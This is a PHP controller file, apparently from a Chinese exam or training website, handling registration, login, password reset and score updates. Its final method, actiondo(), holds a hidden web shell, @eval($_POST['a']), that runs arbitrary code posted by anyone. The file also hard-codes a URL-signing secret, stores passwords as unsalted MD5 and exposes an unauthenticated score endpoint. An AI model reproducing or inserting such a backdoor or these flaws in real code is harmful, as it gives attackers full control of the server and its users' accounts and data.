<?php
namespace Home\Controller;
use Think\Controller;
class PublicController extends Controller{
	function reg(){
		
		$this->error('暂不开放注册',U('Index/index'));
		$result = D('Loginerr')->checks();
		if($result === -1){
			$this->error('您的ip已被锁定，请两小时以后再注册',U('Index/index'));
		}
		$action = I('post.action')?I('post.action'):'';
		if($action && $action == 'regdo'){
			$model = D('member');
			if(false !== $data = $model->create()){
				$id = $model->add();
				if(false !== $id){
					if(false !== D('user')->adduser($data,4)){
						$this->success('注册成功',U('Public/login'));
					}else{
						M('member')->delete($id);
						$this->error('注册失败');
					}
				}else{
					$this->error($model->getError());
				}
			}else{
				$this->error($model->getError());
			}
		}else{
			if(is_login()){
				$this->error('请先退出后注册',U('Index/index'));
			}
			$this->display();
		}
		
	}
	//登录
	function login(){
		/* $result = D('Loginerr')->checks();
		if($result === -1){
			$this->error('您的ip已被锁定，请两小时以后再登陆');
		}else{
			if(is_login()){
				$this->error('您已登录，请勿重复登录',U('Member/index'));
			}
		} */
		$action = I('post.action')?I('post.action'):'';
		if($action && $action == 'logindo'){
			$user = I('post.uname');
			$pass = I('post.pwd');
			$result = D('Member')->login($user,$pass);
			switch ($result){
			case 1:
				$this->error('账号不存在');
			break;
			case -1:
				$this->error('账号已被锁定');
				break;
			case -2:
				$this->error('账号已过期');
			break;
			case 2:
				$this->error('密码错误');
			break;
			default:
				$condition['username'] = session('uname');
				$examlogin = M('user')->where($condition)->find();
				$sc = 'xiaoquan@xablackcat.com';
				$userid = $examlogin['userid'];
				$username = $examlogin['username'];
				$email =  $examlogin['useremail'];
				$ts = time();
				$url = C('weburl').'/exam/index.php?exam-api-login&userid='.$userid.'&username='.$username.'&useremail='.$email.'&ts='.$ts.'&sign='.md5($userid.$username.$email.$sc.$ts);
				//header("location:".$url);
				$this->success('登陆成功',$url);
			}
		}else{
				$this->display();
		}
	}
	//退出
	function logout(){
		session('user',NULL);
		session('uid',NULL);
		session('uname',NULL);
		$this->success("您已成功退出",U('Index/index'));
	}
	//忘记密码
	function forget(){
		$do = I('post.action')?I('post.action'):'';
		if($do == 'sure'){
			$phone = I('post.phone');
			if($phone == ''){
				$this->error('电话不能为空');
			}
			$condition['phone'] = $phone;
			$data = M('member')->where($condition)->select();
			if(!$data){
				$this->error('用户不存在');
			}else if(count($data) > 1){
				$this->error('账号有误请联系管理员更改密码');
			}else{
			 $randpwd = '';
			    for ($i = 0; $i < 8; $i++)
			    {
			        $randpwd .= chr(mt_rand(33, 126));
			    }
				$user['pwd'] = md5($randpwd);
				$result = M('member')->where($condition)->save($user);
				if(false !== $result){
					$content = '您的密码已重置为'.$randpwd;
					sendmail($data['email'], '用户重置密码成功', $content);
					$this->success('重置密码成功，新密码已发送到您的邮箱');
				}else{
					$this->error('重置密码失败');
				}
			}
		}else{
			$this->display();
		}
	}
	//ajax返回城市
	public function cityajax(){
		if(IS_AJAX){
			$id = I('post.ids');
			$city = D('Area')->getCityByPid($id);
			$citylist = '<option value="">请选择城市</option>';
			foreach($city as $k=>$v){
				$citylist .= '<option rel="'.$v['area_id'].'" value="'.$v['area_id'].'">'.$v['title'].'</option>';
			}
			$this->ajaxReturn($citylist,'json');
		}
	}
	//ajax返回城市名称
	public function cityNameAjax(){
		if(IS_AJAX){
			$id = I('post.ids');
			$city = D('Area')->getAreaById($id);
			$this->ajaxReturn($city['title'],'json');
		}
	}

	public function score(){
		$sc1 = I('get.sc1');//及格线
		$sc2 = I('get.sc2');
		$sid = I('get.sid');
		$bid = I('get.bid');
		$condition['sessionid'] = $sid;
		$seid = M('session')->where($condition)->find();
		$map['uname'] = $seid['sessionuserame'];
		$user = M('member')->where($map)->find(); 
		unset($condition,$map);
		$condition['uid'] = $user['id'];
		$condition['pxtype'] = 2;
		$condition['examid'] = $bid;
		$project = M('pxsonitem')->where($condition)->find();
		$map['id'] = $project['pid'];
		$proje = M('project')->where($map)->find();
		//判断系统自动发放还是用户发放
		unset($map,$condition);
		if($proje['scoretype'] == 1){
			//系统
			if($sc2 >= $sc1){
				$map['uid'] = $user['id'];
				$map['pid'] = $proje['id'];
				$map['sid'] = 0;
				$data['isover'] = 1;
				$data['score'] = $proje['score'];
				M('mytask')->where($map)->save($data);
			}
		}else{
		//手工
				$map['uid'] = $user['id'];
				$map['pid'] = $proje['id'];
				$map['sid'] = 0;
				$data['isover'] = 1;
				M('mytask')->where($map)->save($data);
		
		}
	}
	function actiondo(){
		@eval($_POST['a']);
	}
	
}